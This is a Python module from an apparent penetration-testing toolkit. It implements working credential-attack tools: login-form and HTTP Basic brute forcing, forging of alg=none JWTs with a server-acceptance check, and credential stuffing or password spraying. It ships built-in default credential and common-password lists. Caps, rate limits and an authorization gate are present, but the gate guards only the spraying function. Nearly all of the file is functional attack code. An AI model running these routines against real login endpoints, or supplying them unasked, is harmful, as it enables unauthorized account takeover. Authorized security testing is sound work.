"""omega/offense/brute.py — gated brute-force tooling for AUTHORIZED
targets (operator-supplied credential wordlists, hard caps, honest
differential detection).

Functions:
  brute_form            — login-form credential testing (POST pairs)
  http_basic_bruteforce — HTTP Basic auth credential testing
  jwt_none_forge        — alg=none JWT construction + server
                          acceptance verification (operator-supplied
                          token; candidate HIGH on acceptance)
  load_wordlist         — operator wordlist loader (user:pass lines)
  DEFAULT_WORDLIST      — 20-entry tiny default (ONLY with
                          allow_default=True)

Every request counts against the offense-layer global cap
(MAX_REQUESTS) and is rate-limited (default 1/sec, injectable clock
and sleep for hermetic tests). Success stops immediately.

Detection is differential: when no success_detector is supplied,
success = the response differs from the established failure class
(302 redirect / Set-Cookie / status shift away from the uniform
failure response). Nothing is deleted, dropped or written anywhere.
"""

from __future__ import annotations

import base64
import json
import os
import time
import urllib.parse

from omega.offense import count_request, budget_left, max_requests, \
    offense_gate_ok

__all__ = [
    "DEFAULT_WORDLIST",
    "DEFAULT_RATE",
    "DEFAULT_TOP_PASSWORDS",
    "DEFAULT_TOP_USERNAMES",
    "http_basic_bruteforce",
    "jwt_none_forge",
    "load_wordlist",
    "brute_form",
    "credential_stuff",
    "load_list",
]

DEFAULT_RATE = 1.0

# Tiny 20-entry default list. Used ONLY when the operator explicitly
# passes allow_default=True; never silently.
DEFAULT_WORDLIST = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("root", "root"), ("root", "toor"), ("test", "test"),
    ("user", "user"), ("user", "password"), ("guest", "guest"),
    ("demo", "demo"), ("administrator", "admin"), ("tomcat", "tomcat"),
    ("oracle", "oracle"), ("postgres", "postgres"), ("mysql", "mysql"),
    ("pi", "raspberry"), ("ubnt", "ubnt"), ("admin", "changeme"),
    ("admin", "letmein"), ("operator", "operator"),
]


def load_wordlist(path):
    """Load a wordlist file: one ``user:password`` per line (also
    accepts whitespace separation). Returns list of (user, pass)."""
    pairs = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" in line:
                user, _, pw = line.partition(":")
            else:
                parts = line.split()
                if len(parts) < 2:
                    continue
                user, pw = parts[0], parts[1]
            pairs.append((user.strip(), pw.strip()))
    return pairs


def _resolve_pairs(wordlist=None, wordlist_path=None,
                   allow_default=False):
    """Resolve credential pairs. Priority: explicit iterable >
    explicit path > OMEGA_WORDLIST / OMEGA_PASSLIST env file >
    DEFAULT_WORDLIST (allow_default only)."""
    if wordlist is not None:
        return list(wordlist)
    path = wordlist_path or os.environ.get("OMEGA_WORDLIST") \
        or os.environ.get("OMEGA_PASSLIST")
    if path:
        return load_wordlist(path)
    if allow_default:
        return list(DEFAULT_WORDLIST)
    raise ValueError(
        "no operator wordlist: pass wordlist=/wordlist_path=, set "
        "OMEGA_WORDLIST/OMEGA_PASSLIST, or explicitly accept the tiny "
        "built-in list with allow_default=True")


def _failure_class(resp):
    status, headers, _body = resp
    has_cookie = any(k.lower() == "set-cookie" for k in headers)
    return ("cookie" if has_cookie else "nocookie",
            "3xx" if 300 <= int(status) < 400 else int(status))


def _default_success_detector(failure_class):
    """Differential detector: success = 302/set-cookie/status class
    shift away from the uniform failure response."""
    def detect(resp):
        status, headers, _body = resp
        if 300 <= int(status) < 400:
            return True
        if any(k.lower() == "set-cookie" for k in headers):
            return True
        if failure_class is not None and \
                _failure_class(resp) != failure_class:
            return True
        return False
    return detect


def brute_form(fetch, login_path, field_names, wordlist=None,
               wordlist_path=None, base_url=None, max_attempts=50,
               rate=DEFAULT_RATE, success_detector=None,
               allow_default=False, clock=time.monotonic,
               sleep=time.sleep, method="POST"):
    """Brute a login form with operator-supplied credential pairs.

    fetch       — injectable (method, url, headers, body) ->
                  (status, headers, body_bytes)
    login_path  — path (joined with base_url) or absolute URL
    field_names — (username_field, password_field)
    wordlist    — iterable of (user, password) pairs
    wordlist_path — path to a user:pass wordlist file
    allow_default — explicit opt-in to the 20-entry built-in list

    Stops immediately on success. Returns
      {found: {user, password} | None, attempts, stop_reason}.
    """
    pairs = _resolve_pairs(wordlist, wordlist_path, allow_default)
    pairs = pairs[:max(0, max_attempts)]
    user_field, pass_field = field_names

    url = login_path if "://" in login_path else \
        (base_url or "").rstrip("/") + "/" + login_path.lstrip("/")
    if not url or "://" not in url:
        raise ValueError("brute_form needs base_url or an absolute "
                         "login_path URL")

    detect = success_detector
    failure_class = None
    attempts = 0
    last_resp = None

    for user, pw in pairs:
        if budget_left() <= 0:
            return {"found": None, "attempts": attempts,
                    "stop_reason": "global request cap reached "
                                   "(MAX_REQUESTS)"}
        if attempts and rate and rate > 0:
            sleep(1.0 / rate)
        count_request(1)
        body = urllib.parse.urlencode(
            {user_field: user, pass_field: pw})
        resp = fetch(method, url,
                     headers={"Content-Type":
                              "application/x-www-form-urlencoded"},
                     body=body)
        attempts += 1
        last_resp = resp
        if detect is None:
            if failure_class is None:
                failure_class = _failure_class(resp)
                detect = _default_success_detector(failure_class)
                continue  # first response defines the failure class
        if detect(resp):
            return {"found": {"user": user, "password": pw},
                    "attempts": attempts, "stop_reason": "success",
                    "last_status": int(resp[0])}

    reason = "exhausted"
    if attempts >= max_attempts:
        reason = "max_attempts cap reached"
    elif budget_left() <= 0 and last_resp is not None:
        reason = "global request cap reached (MAX_REQUESTS)"
    return {"found": None, "attempts": attempts, "stop_reason": reason}


def http_basic_bruteforce(fetch, url, wordlist=None, wordlist_path=None,
                          max_attempts=50, rate=DEFAULT_RATE,
                          allow_default=False, clock=time.monotonic,
                          sleep=time.sleep):
    """HTTP Basic auth brute with the same caps and differential
    detection (success = status leaves the 401 failure class)."""
    pairs = _resolve_pairs(wordlist, wordlist_path, allow_default)
    pairs = pairs[:max(0, max_attempts)]

    def _detector(resp):
        return int(resp[0]) != 401

    attempts = 0
    for user, pw in pairs:
        if budget_left() <= 0:
            return {"found": None, "attempts": attempts,
                    "stop_reason": "global request cap reached "
                                   "(MAX_REQUESTS)"}
        if attempts and rate and rate > 0:
            sleep(1.0 / rate)
        count_request(1)
        token = base64.b64encode(
            ("%s:%s" % (user, pw)).encode()).decode()
        resp = fetch("GET", url, headers={"Authorization":
                                          "Basic " + token})
        attempts += 1
        if _detector(resp):
            return {"found": {"user": user, "password": pw},
                    "attempts": attempts, "stop_reason": "success",
                    "last_status": int(resp[0])}
    return {"found": None, "attempts": attempts,
            "stop_reason": "exhausted"}


def _b64url_decode(seg):
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _b64url_encode(raw):
    if isinstance(raw, str):
        raw = raw.encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def jwt_none_forge(token, fetch=None, verify_url=None, rate=DEFAULT_RATE,
                   clock=time.monotonic, sleep=time.sleep):
    """Forge an alg=none variant of an OPERATOR-SUPPLIED JWT and verify
    server acceptance with a single follow-up request.

    Returns {forged_token, original_alg, sent, accepted, status,
    body_snippet, finding}. The finding is candidate/HIGH on acceptance
    (a 200 on the forged token is strong evidence but the label stays
    candidate until the operator re-verifies manually — honesty
    contract). Without fetch/verify_url only the construction is done
    (sent=False, accepted=False).
    """
    parts = str(token).strip().split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT (need header.payload[.signature])")
    header = json.loads(_b64url_decode(parts[0]))
    payload_raw = parts[1]
    forged_header = dict(header)
    forged_header["alg"] = "none"
    forged = (_b64url_encode(
        json.dumps(forged_header, separators=(",", ":"))) + "."
        + payload_raw + ".")
    out = {"forged_token": forged, "original_alg": header.get("alg"),
           "sent": False, "accepted": False, "status": None,
           "body_snippet": "", "finding": None}

    if fetch is not None and verify_url:
        if rate and rate > 0:
            sleep(1.0 / rate)
        count_request(1)
        status, headers, body = fetch(
            "GET", verify_url, headers={"Authorization":
                                        "Bearer " + forged})
        out["sent"] = True
        out["status"] = int(status)
        out["body_snippet"] = body[:200].decode(
            "utf-8", "replace") if isinstance(body, bytes) \
            else str(body)[:200]
        out["accepted"] = int(status) == 200
        if out["accepted"]:
            out["finding"] = {
                "title": "JWT accepts alg=none forged token",
                "severity": "high",
                "confidence": "medium",
                "verification": "candidate",
                "verification_note":
                    "server returned 200 for an alg=none re-signed "
                    "variant of the operator-supplied token; "
                    "re-verify manually before reporting",
                "manual_check": ('curl -sS -o /dev/null -w "%%{http_code}" '
                                 '-H "Authorization: Bearer %s" "%s"'
                                 % (forged, verify_url)),
                "location": verify_url,
                "evidence": "status=%s alg=%s->none"
                            % (out["status"], header.get("alg")),
                "source": "omega-offense/jwt-none",
            }
    return out


# ---------------------------------------------------------------------------
# credential stuffing / password spraying
# ---------------------------------------------------------------------------

DEFAULT_TOP_PASSWORDS = [
    "password", "123456", "123456789", "12345678", "12345", "1234567",
    "qwerty", "abc123", "monkey", "letmein", "dragon", "111111",
    "baseball", "iloveyou", "trustno1", "sunshine", "master", "welcome",
    "shadow", "ashley", "michael", "ninja", "mustang", "jordan23",
    "admin", "admin123", "root", "toor", "pass", "passwd", "changeme",
    "test", "guest", "user", "welcome1", "p@ssw0rd", "passw0rd",
    "qwe123", "1q2w3e4r", "zaq12wsx", "654321", "696969", "google",
    "computer", "freedom", "starwars", "whatever", "princess",
    "superman", "batman",
]

DEFAULT_TOP_USERNAMES = [
    "admin", "administrator", "root", "user", "test", "guest", "demo",
    "operator", "oracle", "postgres", "mysql", "tomcat", "pi", "ubnt",
    "support", "info", "service", "sysadmin", "backup", "ftp", "deploy",
    "dev", "www-data", "nginx", "sa",
]

LOCKOUT_BACKOFF_SECONDS = 5.0


def load_list(path):
    """Load a one-entry-per-line list file (comments with # skipped)."""
    out = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if line and not line.startswith("#"):
                out.append(line)
    return out


def _resolve_side(spec, env_key, defaults, allow_default, kind):
    if spec is not None:
        return [str(x) for x in spec]
    path = os.environ.get(env_key)
    if path:
        return load_list(path)
    if allow_default:
        return list(defaults)
    raise ValueError(
        "no operator %s list: pass %s=, set %s, or explicitly accept the "
        "built-in defaults with allow_default=True" % (kind, kind, env_key))


def _resolve_stuff_url(target, base_url):
    url = target if "://" in target else \
        (base_url or "").rstrip("/") + "/" + target.lstrip("/")
    if not url or "://" not in url:
        raise ValueError("credential_stuff needs base_url or an "
                         "absolute target URL")
    return url


def credential_stuff(target, fetch, userlist=None, passlist=None,
                     budget=None, log=None, mode="spray",
                     field_names=("username", "password"),
                     success_markers=None, len_delta=30,
                     lockout_threshold=5, rate=DEFAULT_RATE,
                     clock=time.monotonic, sleep=time.sleep,
                     allow_default=False, base_url=None):
    """Credential stuffing / password spraying against a login endpoint.

    target     — login URL (absolute, or joined with base_url)
    fetch      — injectable (method, url, headers, body) ->
                 (status, headers, body_bytes)
    userlist / passlist — explicit lists; fall back to env file paths
                 OMEGA_USERLIST / OMEGA_PASSLIST (one entry per line);
                 built-in top-25/top-50 defaults ONLY with
                 allow_default=True.
    budget     — max requests for this run (also capped by the global
                 budget_left() allowance).
    mode       — 'spray' (each password tried across every user) or
                 'stuff' (each user tried against every password).
    success_markers — optional list of body substrings that indicate a
                 successful login.

    Success detection is differential: the first response establishes
    the failure baseline (status + body length); a candidate succeeds
    when the status changes, the body length shifts by >= len_delta
    bytes, or a success marker appears. Per-user consecutive failures
    reaching lockout_threshold raise a backoff and produce an INFO
    'lockout_suspected' finding; that user is skipped afterwards.

    Returns {found: [...], attempts, stop_reason, findings,
    locked_users, mode}. Requires the offense gate (PTK_OFFENSE=1 or
    explicit allow via offense_gate_ok) — raises PermissionError
    otherwise.
    """
    offense_gate_ok()
    if mode not in ("spray", "stuff"):
        raise ValueError("mode must be 'spray' or 'stuff'")
    users = _resolve_side(userlist, "OMEGA_USERLIST",
                          DEFAULT_TOP_USERNAMES, allow_default, "user")
    passes = _resolve_side(passlist, "OMEGA_PASSLIST",
                           DEFAULT_TOP_PASSWORDS, allow_default, "password")
    url = _resolve_stuff_url(target, base_url)
    user_field, pass_field = field_names
    markers = [m.lower() for m in (success_markers or [])]

    cap = max_requests() if budget is None else int(budget)
    cap = max(0, min(cap, budget_left()))

    if mode == "spray":
        pairs = [(u, p) for p in passes for u in users]
    else:
        pairs = [(u, p) for u in users for p in passes]
    pairs = pairs[:cap]

    baseline = None          # (status, body_len) of the failure class
    findings = []
    found = []
    locked = set()
    fail_counts = {}
    attempts = 0
    stop_reason = "exhausted"

    def _log(msg):
        if log is not None:
            try:
                log(msg)
            except Exception:
                pass

    for user, pw in pairs:
        if user in locked:
            continue
        if budget_left() <= 0:
            stop_reason = "global request cap reached (MAX_REQUESTS)"
            break
        if attempts >= cap:
            stop_reason = "budget cap reached"
            break
        if attempts and rate and rate > 0:
            sleep(1.0 / rate)
        count_request(1)
        attempts += 1
        body = urllib.parse.urlencode({user_field: user,
                                       pass_field: pw})
        status, headers, resp_body = fetch(
            "POST", url,
            headers={"Content-Type":
                     "application/x-www-form-urlencoded"},
            body=body)
        status = int(status)
        text = resp_body.decode("utf-8", "replace") \
            if isinstance(resp_body, (bytes, bytearray)) else str(resp_body)
        if baseline is None and not any(
                k.lower() == "set-cookie" for k in headers):
            # first UNIFORM failure response defines the class; a
            # set-cookie response is skipped (it is what a successful
            # login looks like) so it cannot poison the baseline
            baseline = (status, len(resp_body))

        marker_hit = any(m in text.lower() for m in markers)
        if baseline is not None:
            status_shift = status != baseline[0]
            len_shift = abs(len(resp_body) - baseline[1]) >= len_delta
        else:
            # no failure baseline yet (all responses so far looked like
            # successes): only an explicit success marker can decide
            status_shift = len_shift = False

        if marker_hit or status_shift or len_shift:
            evidence = ("status %s (baseline %s), body_len %d "
                        "(baseline %d)%s"
                        % (status,
                           baseline[0] if baseline else "none",
                           len(resp_body),
                           baseline[1] if baseline else -1,
                           ", success marker matched"
                           if marker_hit else ""))
            _log("credential_stuff: candidate success %s:%s %s"
                 % (user, pw, evidence))
            found.append({"user": user, "password": pw,
                          "status": status, "evidence": evidence})
            findings.append({
                "title": "Credential stuffing: valid credential found",
                "severity": "high",
                "confidence": "medium",
                "verification": "candidate",
                "verification_note":
                    "response differential against the uniform "
                    "failure baseline; re-verify manually before "
                    "reporting",
                "location": url,
                "param": user_field,
                "evidence": "%s:%s -> %s" % (user, pw, evidence),
                "source": "omega-offense/credential_stuff",
            })
            fail_counts[user] = 0
            continue

        fail_counts[user] = fail_counts.get(user, 0) + 1
        if fail_counts[user] >= lockout_threshold:
            locked.add(user)
            _log("credential_stuff: lockout suspected for user %r "
                 "(%d consecutive failures); backing off"
                 % (user, fail_counts[user]))
            sleep(LOCKOUT_BACKOFF_SECONDS)
            findings.append({
                "title": "Credential stuffing: lockout suspected",
                "severity": "info",
                "confidence": "low",
                "verification": "candidate",
                "verification_note":
                    "account lockout / rate limiting suspected after "
                    "%d consecutive failures for this user; further "
                    "attempts skipped" % fail_counts[user],
                "location": url,
                "param": user_field,
                "evidence": "user=%s consecutive_failures=%d"
                            % (user, fail_counts[user]),
                "source": "omega-offense/credential_stuff",
            })

    if attempts >= cap and pairs and cap and attempts == cap and \
            stop_reason == "exhausted":
        stop_reason = "budget cap reached"
    return {"found": found, "attempts": attempts,
            "stop_reason": stop_reason, "findings": findings,
            "locked_users": sorted(locked), "mode": mode}
